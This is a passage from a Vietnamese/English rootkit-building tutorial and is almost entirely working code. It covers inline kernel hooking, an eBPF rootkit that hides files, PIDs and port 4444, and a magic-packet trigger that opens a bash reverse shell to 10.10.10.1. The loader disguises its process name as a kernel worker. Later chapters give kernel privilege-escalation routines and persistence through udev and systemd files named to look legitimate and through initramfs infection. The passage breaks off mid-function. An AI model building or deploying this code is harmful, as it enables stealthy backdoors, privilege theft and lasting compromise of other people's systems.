        return -ENOENT;
    }

    /* Save original bytes TRƯỚC KHI patch */
    memcpy(hook->orig_bytes, hook->target, HOOK_SIZE);

    /* Create trampoline */
    err = create_trampoline(hook);
    if (err)
        return err;

    /* Build jump-to-hook instruction */
    jmp_code[0] = 0x48;  /* REX.W */
    jmp_code[1] = 0xb8;  /* mov rax, imm64 */
    *(unsigned long *)(jmp_code + 2) = (unsigned long)hook->hook_fn;
    jmp_code[10] = 0xff;  /* jmp rax */
    jmp_code[11] = 0xe0;

    /* Patch target function via stop_machine.
     *
     * stop_machine(fn, data, NULL):
     *   1. Send IPI tới mọi CPU: "stop and spin"
     *   2. Mọi CPU enter idle spin loop
     *   3. fn(data) chạy trên calling CPU (chỉ 1 CPU hoạt động)
     *   4. fn return → tất cả CPUs resume
     *
     * Guarantee: KHÔNG CPU nào execute code bị patch khi đang patch. */
    pd.target = hook->target;
    pd.patch  = jmp_code;
    pd.size   = HOOK_SIZE;

    err = stop_machine(do_patch, &pd, NULL);
    if (err)
        return err;

    hook->active = true;
    pr_info("rk: inline hook installed on %s @ %px\n",
            hook->name, hook->target);
    return 0;
}

static void remove_inline_hook(struct inline_hook *hook)
{
    struct patch_data pd;

    if (!hook->active)
        return;

    /* Restore original bytes via stop_machine — SMP-safe */
    pd.target = hook->target;
    pd.patch  = hook->orig_bytes;
    pd.size   = HOOK_SIZE;

    stop_machine(do_patch, &pd, NULL);

    /* Free trampoline */
    if (hook->trampoline) {
        module_free(THIS_MODULE, hook->trampoline);
        hook->trampoline = NULL;
    }

    hook->active = false;
    pr_info("rk: inline hook removed from %s\n", hook->name);
}
```

---

## Chapter 10: eBPF Rootkit — Thế hệ mới

### 10.1 Makefile cho eBPF rootkit

```makefile
# Makefile.ebpf — Build system cho eBPF rootkit
#
# Prerequisites:
#   sudo apt install clang llvm libbpf-dev linux-headers-$(uname -r)
#   sudo apt install linux-tools-common linux-tools-$(uname -r)
#
# Usage:
#   make -f Makefile.ebpf        # Build everything
#   sudo ./rk_loader             # Load eBPF rootkit

CLANG     := clang
LLC       := llc
BPFTOOL   := bpftool
CC        := gcc

# Kernel header paths
KHEADERS  := /usr/src/linux-headers-$(shell uname -r)

# BPF compile flags
BPF_CFLAGS := -target bpf \
              -D__TARGET_ARCH_x86 \
              -O2 -g \
              -Wall \
              -I$(KHEADERS)/include \
              -I$(KHEADERS)/arch/x86/include

# Userspace loader compile flags
LOADER_CFLAGS  := -Wall -O2 -g
LOADER_LDFLAGS := -lbpf -lelf -lz

.PHONY: all clean

all: rk_loader

# Step 1: Generate vmlinux.h from running kernel BTF data
# vmlinux.h chứa type definitions cho MỌI kernel struct
# Thay thế cho hàng trăm kernel headers
vmlinux.h:
	$(BPFTOOL) btf dump file /sys/kernel/btf/vmlinux format c > $@

# Step 2: Compile eBPF program
rk.bpf.o: rk.bpf.c vmlinux.h
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@

# Step 3: Generate skeleton header (auto-generated loader code)
rk.skel.h: rk.bpf.o
	$(BPFTOOL) gen skeleton $< > $@

# Step 4: Compile userspace loader
rk_loader: rk_loader.c rk.skel.h
	$(CC) $(LOADER_CFLAGS) -o $@ $< $(LOADER_LDFLAGS)

clean:
	rm -f vmlinux.h rk.bpf.o rk.skel.h rk_loader
```

### 10.2 eBPF kernel programs (rk.bpf.c)

```c
/* rk.bpf.c — eBPF rootkit kernel programs
 *
 * Compile: clang -target bpf -O2 -g -c rk.bpf.c -o rk.bpf.o
 *
 * File này chứa THỰC SỰ compilable eBPF programs.
 * Mỗi SEC() macro định nghĩa một program attach point.
 *
 * eBPF constraints (verifier enforce):
 *   - Stack: max 512 bytes
 *   - No unbounded loops (bounded loops OK since kernel 5.3)
 *   - No arbitrary memory access (must use bpf_probe_read_*)
 *   - No calling arbitrary functions (only BPF helpers)
 *   - Programs must terminate (verifier proves termination)
 *   - Max 1M verified instructions (configurable)
 *
 * eBPF rootkit KHÁC LKM rootkit fundamental:
 *   - Không cần kernel module (không cần insmod, không cần root trên một số config)
 *   - Không xuất hiện trong lsmod (vì không phải module)
 *   - eBPF programs run trong verified sandbox
 *   - Persist qua bpf filesystem pinning
 *   - Legitimate tools (Cilium, Falco) cũng dùng eBPF → khó phân biệt
 *
 * Components:
 *   1. eBPF programs (chạy trong kernel)   → .bpf.c files
 *   2. Userspace loader (load + manage)     → .c file (dùng libbpf)
 *   3. eBPF maps (shared data kernel↔user) → defined trong .bpf.c
 *
 * BUILD SYSTEM:
 *   Cần: clang, llvm, libbpf, bpftool, kernel headers
 *
 *   Makefile:
 *     clang -target bpf -O2 -g -c rootkit.bpf.c -o rootkit.bpf.o
 *     bpftool gen skeleton rootkit.bpf.o > rootkit.skel.h
 *     gcc -o loader loader.c -lbpf -lelf -lz
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define HIDDEN_PREFIX     "rk_"
#define HIDDEN_PREFIX_LEN 3
#define HIDDEN_PORT       4444
#define MAGIC_SIGNAL      54
#define TASK_COMM_LEN     16
#define MAX_ENTRIES       128

char LICENSE[] SEC("license") = "GPL";

/* ══════════════════════════════════════════════════════════════
 * BPF MAPS — Shared data structures
 *
 * Maps = kernel↔userspace shared data structures.
 * Types: hash, array, ringbuf, perf_event_array, etc.
 *
 * Kernel programs write data → userspace reads.
 * Userspace writes config → kernel programs read.
 * ══════════════════════════════════════════════════════════════ */

/* Map: lưu dirent buffer pointer cho syscall exit handler.
 *
 * Key   = pid_tgid (u64): unique per thread
 * Value = buf_info: saved syscall arguments
 *
 * Flow:
 *   sys_enter_getdents64 → save buffer pointer vào map
 *   sys_exit_getdents64  → lookup buffer pointer, modify data
 */
struct buf_info {
    __u64 dirent_buf;    /* Userspace dirent buffer address */
    __u32 fd;            /* File descriptor */
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);           /* pid_tgid */
    __type(value, struct buf_info);
} dirent_map SEC(".maps");

/* Map: PIDs cần ẩn. Userspace loader add/remove PIDs. */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);            /* PID */
    __type(value, __u8);           /* dummy value, existence = hidden */
} hidden_pids SEC(".maps");

/* Map: events ring buffer — kernel gửi events tới userspace */
struct event {
    __u32 pid;
    __u32 uid;
    __u8  type;           /* 1=exec, 2=connect, 3=magic_signal */
    char  comm[TASK_COMM_LEN];
    char  filename[256];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);   /* 256 KB ring buffer */
} events SEC(".maps");

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 1: Getdents64 interception — File/Process hiding
 *
 * Attach: tracepoint/syscalls/sys_enter_getdents64
 *         tracepoint/syscalls/sys_exit_getdents64
 *
 * Strategy:
 *   Enter: save buffer pointer và fd
 *   Exit:  read buffer, find hidden entries, overwrite d_reclen
 *          của entry trước (nuốt hidden entry)
 *
 * Giới hạn eBPF vs LKM:
 *   - bpf_probe_write_user(): CÓ THỂ ghi userspace memory
 *     NHƯNG: verifier flag nó là "unsafe", cần CAP_SYS_ADMIN
 *   - Stack limit 512 bytes → không thể copy toàn bộ buffer
 *   - Phải iterate với bounded loop → max entries limited
 * ══════════════════════════════════════════════════════════════ */

SEC("tracepoint/syscalls/sys_enter_getdents64")
int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct buf_info info;

    /* ctx->args[0] = fd
     * ctx->args[1] = dirent buffer pointer
     * ctx->args[2] = count (buffer size)
     *
     * Tracepoint args access khác kprobe:
     * Tracepoint: args indexed by position
     * Kprobe: PT_REGS_PARM1(ctx), etc. */
    info.fd = (__u32)ctx->args[0];
    info.dirent_buf = (__u64)ctx->args[1];

    bpf_map_update_elem(&dirent_map, &pid_tgid, &info, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct buf_info *info;
    long ret = ctx->ret;

    /* Lookup saved buffer info */
    info = bpf_map_lookup_elem(&dirent_map, &pid_tgid);
    if (!info || ret <= 0)
        goto cleanup;

    /* ── Iterate directory entries ──
     *
     * Bounded loop: eBPF verifier requires provably finite loops.
     * MAX_ENTRIES = max number of iterations.
     * Nếu directory có >MAX_ENTRIES entries → entries cuối không filtered.
     *
     * Mỗi iteration:
     *   1. Read d_reclen và d_name từ userspace
     *   2. Check nếu cần hide
     *   3. Nếu hide: overwrite d_reclen của entry trước
     */
    __u64 offset = 0;
    __u64 prev_offset = 0;
    __u16 prev_reclen = 0;

    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (offset >= (__u64)ret)
            break;

        /* Read d_reclen (2 bytes tại offset+16 trong linux_dirent64)
         *
         * struct linux_dirent64:
         *   offset 0:  d_ino    (8 bytes)
         *   offset 8:  d_off    (8 bytes)
         *   offset 16: d_reclen (2 bytes)  ← ta đọc cái này
         *   offset 18: d_type   (1 byte)
         *   offset 19: d_name[] (variable)
         */
        __u16 d_reclen = 0;
        bpf_probe_read_user(&d_reclen,
                             sizeof(d_reclen),
                             (void *)(info->dirent_buf + offset + 16));
        if (d_reclen == 0)
            break;

        /* Read d_name (max 256 bytes, offset 19) */
        char d_name[256];
        __builtin_memset(d_name, 0, sizeof(d_name));

        __u16 name_len = d_reclen - 19;  /* 19 = header size before d_name */
        if (name_len > 255) name_len = 255;

        bpf_probe_read_user_str(d_name, name_len + 1,
                                 (void *)(info->dirent_buf + offset + 19));

        /* Check hide criteria */
        bool hide = false;

        /* Check filename prefix */
        if (d_name[0] == 'r' && d_name[1] == 'k' && d_name[2] == '_')
            hide = true;

        /* Check hidden PID (numeric name in /proc) */
        if (!hide && d_name[0] >= '0' && d_name[0] <= '9') {
            __u32 pid = 0;
            for (int j = 0; j < 10 && d_name[j] >= '0' && d_name[j] <= '9'; j++)
                pid = pid * 10 + (d_name[j] - '0');

            __u8 *is_hidden = bpf_map_lookup_elem(&hidden_pids, &pid);
            if (is_hidden)
                hide = true;
        }

        /* Perform hiding: expand previous entry's d_reclen */
        if (hide && prev_reclen > 0) {
            __u16 new_reclen = prev_reclen + d_reclen;
            /* bpf_probe_write_user: write vào userspace memory.
             *
             * DANGEROUS helper:
             *   - Verifier flags program as "unsafe"
             *   - Requires CAP_SYS_ADMIN
             *   - Can corrupt userspace data nếu offset sai
             *   - Một số kernel configs restrict/disable nó
             *
             * Ghi d_reclen mới cho entry trước:
             *   prev entry tại (buf + prev_offset + 16) */
            bpf_probe_write_user(
                (void *)(info->dirent_buf + prev_offset + 16),
                &new_reclen,
                sizeof(new_reclen));

            /* Không update prev_offset/prev_reclen — giữ nguyên
             * vì current entry bị "nuốt" vào prev. */
        } else {
            prev_offset = offset;
            prev_reclen = d_reclen;
        }

        offset += d_reclen;
    }

cleanup:
    bpf_map_delete_elem(&dirent_map, &pid_tgid);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 2: Execve monitoring — Log mọi process execution
 *
 * Attach: tracepoint/syscalls/sys_enter_execve
 *
 * Send event tới userspace qua ring buffer.
 * Userspace logger/C2 component nhận và process.
 * ══════════════════════════════════════════════════════════════ */

SEC("tracepoint/syscalls/sys_enter_execve")
int handle_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct event *e;

    /* Reserve space trong ring buffer.
     *
     * bpf_ringbuf_reserve: allocate slot trong ring buffer.
     * Return NULL nếu buffer full (data loss — acceptable).
     * Phải gọi bpf_ringbuf_submit() hoặc bpf_ringbuf_discard(). */
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;

    e->type = 1;  /* exec event */
    e->pid = bpf_get_current_pid_tgid() >> 32;  /* PID = upper 32 bits */
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;  /* UID = lower 32 */
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    /* Read filename (arg1 của execve) từ userspace.
     * ctx->args[0] = pointer tới filename string trong userspace. */
    bpf_probe_read_user_str(e->filename, sizeof(e->filename),
                             (void *)ctx->args[0]);

    bpf_ringbuf_submit(e, 0);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 3: XDP — Network packet filtering
 *
 * Attach: XDP hook trên network interface
 *
 * XDP = eXpress Data Path. Hook tại NIC driver level.
 * TRƯỚC Netfilter, TRƯỚC tc, TRƯỚC socket layer.
 * TRƯỚC tcpdump (nếu dùng AF_PACKET sau XDP).
 *
 * Ưu điểm cho rootkit:
 *   - Fastest possible network hook
 *   - Packets bị drop/modify TRƯỚC mọi monitoring tool
 *   - Legitimate use case (DDoS protection) → hard to distinguish
 *
 * XDP actions:
 *   XDP_PASS:     pass packet to kernel network stack (normal)
 *   XDP_DROP:     drop packet at NIC — BEFORE any kernel processing
 *   XDP_TX:       bounce packet back out same NIC
 *   XDP_REDIRECT: send packet to different NIC/CPU
 *   XDP_ABORTED:  error, drop and notify
 * ══════════════════════════════════════════════════════════════ */

#define MAGIC_VALUE 0xDEAD1337
#define ETH_P_IP    0x0800

SEC("xdp")
int xdp_filter(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* ── Parse Ethernet header ── */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;
    if (eth->h_proto != __bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* ── Parse IP header ── */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* ── ICMP magic packet check ── */
    if (ip->protocol == IPPROTO_ICMP) {
        struct icmphdr *icmp = (void *)ip + (ip->ihl * 4);
        if ((void *)(icmp + 1) > data_end)
            return XDP_PASS;

        if (icmp->type == 8) {  /* Echo Request */
            void *payload = (void *)(icmp + 1);
            if (payload + 4 > data_end)
                return XDP_PASS;

            __u32 magic = *(__u32 *)payload;
            if (magic == __bpf_htonl(MAGIC_VALUE)) {
                /* Magic packet detected!
                 * Send event tới userspace cho handling.
                 * XDP_DROP: packet never reaches kernel stack. */

                struct event *e = bpf_ringbuf_reserve(&events,
                                                       sizeof(*e), 0);
                if (e) {
                    e->type = 3;  /* magic packet event */
                    e->pid = 0;
                    __builtin_memcpy(&e->comm, "xdp_magic", 10);
                    bpf_ringbuf_submit(e, 0);
                }

                return XDP_DROP;
            }
        }
    }

    /* ── TCP hidden port check ── */
    if (ip->protocol == IPPROTO_TCP) {
        struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
        if ((void *)(tcp + 1) > data_end)
            return XDP_PASS;

        __u16 dport = __bpf_ntohs(tcp->dest);
        __u16 sport = __bpf_ntohs(tcp->source);

        /* Optional: drop packets TO hidden port from external
         * scanners. Cho phép packets FROM hidden port (response). */
    }

    return XDP_PASS;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 4: Network connection hiding via /proc/net/tcp hook
 *
 * Attach: kprobe trên tcp4_seq_show
 *
 * Dùng bpf_override_return để skip output khi tcp4_seq_show
 * chuẩn bị output connection trên hidden port.
 *
 * Requirements:
 *   CONFIG_BPF_KPROBE_OVERRIDE=y
 *   tcp4_seq_show annotated with ALLOW_ERROR_INJECTION (kernel 5.7+)
 *   Program type = kprobe (NOT fentry — fentry KHÔNG support
 *   bpf_override_return)
 * ══════════════════════════════════════════════════════════════ */

SEC("kprobe/tcp4_seq_show")
int hide_tcp_kprobe(struct pt_regs *ctx)
{
    struct seq_file *seq;
    void *v;
    struct sock *sk;
    struct inet_sock *inet;
    __u16 sport, dport;

    /* arg1 = seq_file *, arg2 = void *v */
    seq = (struct seq_file *)PT_REGS_PARM1(ctx);
    v = (void *)PT_REGS_PARM2(ctx);

    if (v == (void *)1) return 0;  /* SEQ_START_TOKEN */

    sk = (struct sock *)v;
    inet = (struct inet_sock *)sk;
    sport = BPF_CORE_READ(inet, inet_sport);
    dport = BPF_CORE_READ(sk, __sk_common.skc_dport);
    sport = __bpf_ntohs(sport);
    dport = __bpf_ntohs(dport);

    if (sport == HIDDEN_PORT || dport == HIDDEN_PORT) {
        /* bpf_override_return: make tcp4_seq_show return
         * SEQ_SKIP (1) → seq_file skips this entry's output.
         *
         * Requirements:
         *   CONFIG_BPF_KPROBE_OVERRIDE=y
         *   tcp4_seq_show annotated with ALLOW_ERROR_INJECTION
         *   Program type = kprobe (NOT fentry)
         */
        bpf_override_return(ctx, 1);  /* SEQ_SKIP */
        return 0;
    }

    return 0;
}
```

### 10.3 Userspace loader (rk_loader.c)

```c
/* rk_loader.c — eBPF rootkit userspace loader
 *
 * Compile: gcc -Wall -O2 -o rk_loader rk_loader.c -lbpf -lelf -lz
 * Run:     sudo ./rk_loader
 *
 * Loader responsibilities:
 *   1. Load eBPF programs vào kernel
 *   2. Attach programs tới hook points
 *   3. Pin programs (persistence)
 *   4. Read events từ ring buffer
 *   5. Handle magic packet commands
 *   6. Manage hidden PID list
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "rk.skel.h"

static volatile bool running = true;
static void sig_handler(int sig) { running = false; }

/* Event callback — handle events từ kernel eBPF programs */
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    struct event {
        __u32 pid;
        __u32 uid;
        __u8  type;
        char  comm[16];
        char  filename[256];
    } *e = data;

    switch (e->type) {
    case 1:  /* exec event */
        /* Log hoặc forward tới C2 */
        fprintf(stderr, "[exec] pid=%d uid=%d comm=%s file=%s\n",
                e->pid, e->uid, e->comm, e->filename);
        break;

    case 3:  /* magic packet */
        fprintf(stderr, "[!] Magic packet received!\n");
        /* Trigger backdoor action */
        system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 &'");
        break;
    }

    return 0;
}

int main(int argc, char **argv)
{
    struct rk_bpf *skel;
    struct ring_buffer *rb = NULL;
    int err;

    /* Raise RLIMIT_MEMLOCK cho BPF maps.
     * eBPF maps dùng locked memory — default limit quá nhỏ. */
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    /* ── Step 1: Open + Load eBPF programs ──
     *
     * xxx__open_and_load():
     *   1. Parse ELF file (rk.bpf.o embedded trong skeleton)
     *   2. Create BPF maps in kernel
     *   3. Relocate programs (fix up map references)
     *   4. Load programs via bpf() syscall
     *   5. Verifier checks each program (can fail here)
     */
    skel = rk_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open/load BPF skeleton\n");
        return 1;
    }
    fprintf(stderr, "BPF programs loaded\n");

    /* ── Step 2: Attach programs tới hook points ──
     *
     * xxx__attach():
     *   Mỗi program attach theo SEC() type:
     *   - "tracepoint/..." → attach_tracepoint()
     *   - "kprobe/..."     → attach_kprobe()
     *   - "xdp"            → attach_xdp() (needs interface)
     *   - "fentry/..."     → attach_fentry()
     */
    err = rk_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach: %d\n", err);
        goto cleanup;
    }
    fprintf(stderr, "BPF programs attached\n");

    /* ── Step 3: Pin programs cho persistence ──
     *
     * BPF filesystem (/sys/fs/bpf/) cho phép pin programs+maps.
     * Pinned objects persist ngay cả khi loader process exit.
     * → eBPF rootkit tiếp tục chạy sau khi loader thoát.
     *
     * Để remove: rm /sys/fs/bpf/rk/* hoặc bpftool prog detach
     */
    err = bpf_object__pin(skel->obj, "/sys/fs/bpf/rk");
    if (err && err != -EEXIST) {
        fprintf(stderr, "Failed to pin: %d (non-fatal)\n", err);
        /* Non-fatal: programs still work, just no persistence */
    }

    /* ── Step 4: Setup ring buffer reader ── */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.events),
                           handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /* ── Step 5: Daemonize ──
     * Detach từ terminal, chạy background.
     * Process name disguise: overwrite argv. */
    if (argc <= 1 || strcmp(argv[1], "--foreground") != 0) {
        daemon(0, 0);
        /* Overwrite process name */
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], "[kworker/0:2]");
    }

    fprintf(stderr, "eBPF rootkit active. PID=%d\n", getpid());

    /* ── Step 6: Event loop ── */
    while (running) {
        err = ring_buffer__poll(rb, 100 /* timeout ms */);
        if (err == -EINTR)
            break;
        if (err < 0) {
            fprintf(stderr, "ring_buffer__poll error: %d\n", err);
            break;
        }
    }

cleanup:
    ring_buffer__free(rb);
    rk_bpf__destroy(skel);
    return 0;
}
```

---

## Chapter 11: Privilege Escalation

```c
/* privesc.c — Tất cả phương pháp escalate privilege từ kernel
 *
 * Khi đã có code execution trong kernel (Ring 0),
 * privilege escalation trở thành trivial:
 * ta có quyền TRỰC TIẾP modify credential structures.
 *
 * 3 phương pháp chính:
 */

#include "rootkit.h"

/* ═══════════════════════════════════════
 * METHOD 1: prepare_creds + commit_creds (RECOMMENDED)
 * 
 * Dùng kernel API chính thức.
 * An toàn nhất, handle locking + RCU đúng.
 * ═══════════════════════════════════════ */
static void privesc_api(void)
{
    struct cred *new = prepare_creds();
    if (!new) return;

    new->uid  = new->euid  = new->suid  = new->fsuid  = GLOBAL_ROOT_UID;
    new->gid  = new->egid  = new->sgid  = new->fsgid  = GLOBAL_ROOT_GID;
    new->cap_effective   = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_inheritable = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;
    new->cap_ambient     = CAP_FULL_SET;

    commit_creds(new);
}

/* ═══════════════════════════════════════
 * METHOD 2: prepare_kernel_cred(NULL) — One-liner
 *
 * prepare_kernel_cred(NULL) tạo credential set giống init process:
 *   uid=0, gid=0, full capabilities
 *
 * Simplest possible privesc.
 * Common trong kernel exploits (stack overflow → ROP → this).
 *
 * QUAN TRỌNG: phải check NULL return.
 * Nếu kmalloc fail → prepare_kernel_cred returns NULL
 * → commit_creds(NULL) → NULL dereference → kernel panic.
 * ═══════════════════════════════════════ */
static void privesc_kernel_cred(void)
{
    struct cred *new;

    new = prepare_kernel_cred(NULL);
    if (!new) {
        pr_warn("rk: prepare_kernel_cred failed\n");
        return;
    }
    commit_creds(new);
}

/* ═══════════════════════════════════════
 * METHOD 3: Direct memory write (DKOM approach)
 *
 * Bypass API hoàn toàn. Không trigger audit hooks.
 * Nhưng violates kernel invariants.
 * ═══════════════════════════════════════ */
static void privesc_dkom(void)
{
    struct cred *cred = (struct cred *)current->cred;

    /* Direct write — no locking, no audit, no RCU */
    *(kuid_t *)&cred->uid  = GLOBAL_ROOT_UID;
    *(kuid_t *)&cred->euid = GLOBAL_ROOT_UID;
    *(kgid_t *)&cred->gid  = GLOBAL_ROOT_GID;
    *(kgid_t *)&cred->egid = GLOBAL_ROOT_GID;
    cred->cap_effective = CAP_FULL_SET;
    cred->cap_permitted = CAP_FULL_SET;

    /* Bypass SELinux/AppArmor:
     * security field trong cred chứa LSM-specific data.
     * Setting NULL hoặc init_cred's security = bypass MAC. */
}
```

---

---

# Part III — Operations & Infrastructure

## Chapter 12: Persistence

```c
/* persistence.c — 7 phương pháp persist rootkit qua reboot
 *
 * Kernel module chỉ sống trong RAM → reboot = mất.
 * Persistence mechanism đảm bảo module auto-load sau reboot.
 *
 * Mỗi phương pháp có trade-off stealth vs reliability.
 * APT thường dùng NHIỀU layers (defense in depth cho persistence).
 */

#include "rootkit.h"
#include <linux/kmod.h>

/* ══════════════════════════════════════════════════════════════
 * METHOD 1: /etc/modules-load.d/ — Systemd auto-load
 *
 * Stealth: LOW (admin check file → thấy ngay)
 * Reliability: HIGH (systemd guaranteed)
 *
 * Tạo file /etc/modules-load.d/MODULE.conf chứa module name.
 * systemd-modules-load.service đọc file này khi boot.
 * ══════════════════════════════════════════════════════════════ */
static void persist_modules_load_d(const char *module_name,
                                    const char *ko_path)
{
    char cmd[1024];

    /* Copy .ko vào standard module directory */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a 2>/dev/null; "
        "echo '%s' > /etc/modules-load.d/%s.conf",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 2: /etc/modules (legacy) — init system auto-load
 *
 * Stealth: LOW
 * Reliability: HIGH (works on sysvinit, upstart, systemd)
 * ══════════════════════════════════════════════════════════════ */
static void persist_etc_modules(const char *module_name,
                                 const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a 2>/dev/null; "
        /* Append module name nếu chưa có */
        "grep -qxF '%s' /etc/modules || echo '%s' >> /etc/modules",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 3: Udev rule — Load khi hardware event
 *
 * Stealth: MEDIUM (udev rules ít ai check manually)
 * Reliability: HIGH (udev luôn chạy)
 *
 * Udev rule trigger khi kernel detect hardware.
 * "Add any device" → load module.
 * Disguise: đặt tên rule giống legitimate module.
 * ══════════════════════════════════════════════════════════════ */
static void persist_udev_rule(const char *module_name,
                               const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko 2>/dev/null; "
        "depmod -a; "
        /* Rule disguised as audio driver loader */
        "echo 'ACTION==\"add\", "
        "SUBSYSTEM==\"module\", "
        "RUN+=\"/sbin/modprobe %s\"' "
        "> /etc/udev/rules.d/99-audio-firmware.rules; "
        "udevadm control --reload-rules",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 4: Systemd service — Maximum control
 *
 * Stealth: MEDIUM (service ẩn nếu rootkit hide file)
 * Reliability: HIGH (systemd restart on failure)
 *
 * Tạo systemd service file → auto-start, auto-restart.
 * After rootkit load → rootkit ẩn service file via getdents64 hook.
 * ══════════════════════════════════════════════════════════════ */
static void persist_systemd_service(const char *module_name,
                                     const char *ko_path)
{
    char cmd[2048];

    /* Service file disguised as firmware helper */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        "cat > /etc/systemd/system/firmware-helper.service << 'EOF'\n"
        "[Unit]\n"
        "Description=Firmware Helper Service\n"
        "DefaultDependencies=no\n"
        "After=systemd-modules-load.service\n"
        "Before=sysinit.target\n"
        "\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/sbin/modprobe %s\n"
        "RemainAfterExit=yes\n"
        "\n"
        "[Install]\n"
        "WantedBy=sysinit.target\n"
        "EOF\n"
        "systemctl daemon-reload; "
        "systemctl enable firmware-helper.service 2>/dev/null",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 5: Infect initramfs — Load TRƯỚC root filesystem mount
 *
 * Stealth: HIGH (initramfs ít khi inspected)
 * Reliability: VERY HIGH (runs earliest in boot)
 * Complexity: HIGH (phải rebuild initramfs correctly)
 *
 * initramfs = temporary root filesystem loaded by bootloader.
 * Kernel mounts initramfs → runs /init → mounts real root.
 * Module loaded từ initramfs chạy TRƯỚC mọi thứ.
 *
 * Survive: kernel updates (nếu hook update-initramfs)
 * ══════════════════════════════════════════════════════════════ */
static void persist_initramfs(const char *module_name,
                               const char *ko_path)
{
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        /* 1. Copy module vào initramfs staging area */
        "mkdir -p /etc/initramfs-tools/modules.d/ 2>/dev/null; "
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "

        /* 2. Create hook script cho initramfs-tools (Debian/Ubuntu) */
        "cat > /etc/initramfs-tools/hooks/firmware-mod << 'HOOKEOF'\n"
        "#!/bin/sh\n"
        "PREREQ=\"\"\n"
        "prereqs() { echo \"$PREREQ\"; }\n"
        "case $1 in prereqs) prereqs; exit 0;; esac\n"
        ". /usr/share/initramfs-tools/hook-functions\n"
        "manual_add_modules %s\n"
        "HOOKEOF\n"
        "chmod +x /etc/initramfs-tools/hooks/firmware-mod; "

        /* 3. Add module to load list */
        "echo '%s' >> /etc/initramfs-tools/modules; "

        /* 4. Rebuild initramfs */
        "update-initramfs -u -k $(uname -r) 2>/dev/null; "
        /* Dracut equivalent (RHEL/Fedora): */
        "dracut --force 2>/dev/null || true",

        ko_path, module_name, module_name, module_name);

